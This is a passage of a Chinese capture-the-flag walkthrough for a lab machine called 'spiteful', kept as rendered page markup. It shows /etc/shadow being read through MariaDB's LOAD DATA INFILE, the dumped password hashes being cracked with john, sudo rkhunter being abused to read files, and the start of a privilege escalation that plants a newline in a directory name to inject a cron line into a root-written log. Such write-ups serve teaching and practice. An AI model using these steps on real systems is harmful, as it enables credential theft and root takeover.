punctuation"}},[s._v(".")]),s._v("tmp_shadow "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("line "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("TEXT")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("-- 加载数据")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("LOAD")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("DATA")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("INFILE")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/etc/shadow'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("INTO")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("TABLE")]),s._v(" mazesec_core"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("tmp_shadow"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\nMariaDB "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("none"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("select")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" mazesec_core"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("tmp_shadow"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("----------------------------------------------------------------------------------------------------------------------------------------+")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" line                                                                                                                                   "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("----------------------------------------------------------------------------------------------------------------------------------------+")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" root:$"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6")]),s._v("$xA3MLM7qaAix4orA$UyEIaKdpJfIxBAsXQQLO6sALP79EQTLBFjBtYRPr9b2fVxYRyQBfqXl4fKfqn6eJXBomh3wldQp"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v("NO8ql2mt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("20413")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(":::::           "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" bin:"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("::"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(":::::                                                                                                                          "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" daemon:"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("::"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(":::::                                                                                                                       "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" lp:"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("::"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(":::::                                                                                                                           "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" sync:"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("::"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(":::::                                                                                                                         "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("shutdown")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("::"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(":::::                                                                                                                     "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" halt:"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("::"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(":::::                                                                                                                         "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" mail:"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("::"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(":::::                                                                                                                         "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" news:"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("::"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(":::::                                                                                                                         "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" uucp:"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("::"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(":::::                                                                                                                         "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" cron:"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("::"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(":::::                                                                                                                         "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" ftp:"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("::"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(":::::                                                                                                                          "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" sshd:"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("::"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(":::::                                                                                                                         "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" games:"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("::"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(":::::                                                                                                                        "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" ntp:"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("::"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(":::::                                                                                                                          "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" guest:"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("::"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(":::::                                                                                                                        "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" nobody:"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("::"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(":::::                                                                                                                       "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" klogd:"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("20408")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("99999")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("7")]),s._v(":::                                                                                                             "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" todd:$"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6")]),s._v("$fCTbQzCBKasVu4mG$n6Zwx9JjzE73ezRQ"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("ThbeklJENtvm44iZUXDTYEtloTCVXfg6"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("dMhtKL53mhDCXAABnh10ku06jSORDI5Fkco0:"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("20413")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("99999")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("7")]),s._v(":::     "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" rkhunter:$"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6")]),s._v("$gt7yBABSpQ1I0AQO$iTJUHLJbEKA39ltlAiH00jlljCBZJ10Pc4dWdhy3mXJwWt5XA3zzR7CeiYyiUVeoaMVpiBDL419BcGLHt6"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("Yj"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("20413")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("99999")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("7")]),s._v("::: "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" mysql:"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("20413")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("99999")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("7")]),s._v(":::                                                                                                             "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" nginx:"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("20413")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("99999")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("7")]),s._v(":::                                                                                                             "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("----------------------------------------------------------------------------------------------------------------------------------------+")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("rows")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("in")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("set")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.001")]),s._v(" sec"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/23.png",alt:""}})]),s._v(" "),a("p",[s._v("爆破用户密码")]),s._v(" "),a("p",[s._v("将 shadow 内容写入到 all_hashes.txt 文件")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" all_hashes.txt "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<<")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'EOF'\nroot:$6$xA3MLM7qaAix4orA$UyEIaKdpJfIxBAsXQQLO6sALP79EQTLBFjBtYRPr9b2fVxYRyQBfqXl4fKfqn6eJXBomh3wldQp/4NO8ql2mt.\ntodd:$6$fCTbQzCBKasVu4mG$n6Zwx9JjzE73ezRQ/ThbeklJENtvm44iZUXDTYEtloTCVXfg6.dMhtKL53mhDCXAABnh10ku06jSORDI5Fkco0\nrkhunter:$6$gt7yBABSpQ1I0AQO$iTJUHLJbEKA39ltlAiH00jlljCBZJ10Pc4dWdhy3mXJwWt5XA3zzR7CeiYyiUVeoaMVpiBDL419BcGLHt6.Yj.\nEOF")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[s._v("john 破解密码，拿到 rkhunter 用户密码 markhunter")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~/mazesec/spiteful"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ john "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--wordlist")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/usr/share/wordlists/rockyou.txt all_hashes.txt \n\nmarkhunter       "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("rkhunter"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("  \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("rkhunter：markhunter")]),s._v(" "),a("h2",{attrs:{id:"rkhunter-读取文件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#rkhunter-读取文件"}},[s._v("#")]),s._v(" rkhunter 读取文件")]),s._v(" "),a("p",[s._v("rkhunter 用户可以使用 sudo 执行 rkhunter")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/24.png",alt:""}})]),s._v(" "),a("p",[s._v("rkhunter的参数里有 -C --configfile，可以指定配置文件，检查配置文件内容")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("spiteful:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" root rkhunter "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-C")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--configfile")]),s._v(" /etc/passwd\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("通过报错，把内容读出来，比较遗憾，flag不是 root.txt，要拿 shell 了")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/25.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"rkhunter-提权思路"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#rkhunter-提权思路"}},[s._v("#")]),s._v(" rkhunter 提权思路")]),s._v(" "),a("p",[s._v("rkhunter 有 -l 参数，可以写一个日志文件，在测试过程，我发现日志有一行似乎可控")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("spiteful:/tmp$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" root rkhunter "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-c")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--novl")]),s._v(" --noappend-log "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-l")]),s._v(" /tmp/1111\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v(" Rootkit Hunter version "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.4")]),s._v(".6 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n\nChecking system commands"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v(".\n\n  Performing "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'strings'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("command")]),s._v(" checks\n^C\nspiteful:/tmp$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" /tmp/1111\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("03:51:33"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Running Rootkit Hunter version "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.4")]),s._v(".6 on spiteful\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("03:51:33"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("03:51:33"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Info: Start "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("date")]),s._v(" is Tue Nov "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("25")]),s._v(" 03:51:33 UTC "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2025")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("03:51:33"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("03:51:33"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Checking configuration "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("file")]),s._v(" and command-line options"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v(".\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("03:51:33"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Info: Detected operating system is "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Linux'")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("03:51:33"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Info: Found O/S name: Alpine Linux v3.22\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("03:51:33"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Info: Command line is /usr/local/bin/rkhunter "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-c")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--novl")]),s._v(" --noappend-log "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-l")]),s._v(" /tmp/1111\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("03:51:33"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Info: Environment shell is /bin/sh"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" rkhunter is using busybox\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br")])]),a("p",[s._v("在倒数第二行，比较吸引我，他会把命令行参数写到日志里，如果能在参数里换行，就能构造出一行定时任务格式")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("[03:51:33] Info: Command line is /usr/local/bin/rkhunter -c --novl --noappend-log -l /tmp/1111\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("控制一行内容有什么用？")]),s._v(" "),a("p",[a("strong",[s._v("定时任务文件某一行格式错了，只会跳过那一行，不会影响其他正常行继续执行。")])]),s._v(" "),a("p",[s._v("尝试控制其他参数，创建换行条件")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("spiteful:/tmp$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mkdir")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("$'/tmp/"),a("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v("111'")]),s._v("\nspiteful:/tmp$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("touch")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(".txt\nspiteful:/tmp$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" root rkhunter "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-c")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--novl")]),s._v(" --noappend-log "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-l")]),s._v(" /tmp/1.txt "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--tmpdir")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("$'/tmp/"),a("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v("111'")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v(" Rootkit Hunter version "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.4")]),s._v(".6 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n\nChecking system commands"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v(".\n\n  Performing "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'strings'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("command")]),s._v(" checks\n^C\nspiteful:/tmp$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" /tmp/1.txt\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("03:56:19"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Running Rootkit Hunter version "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.4")]),s._v(".6 on spiteful\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("03:56:19"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("03:56:19"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Info: Start "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("date")]),s._v(" is Tue Nov "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("25")]),s._v(" 03:56:19 UTC "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2025")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("03:56:19"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token 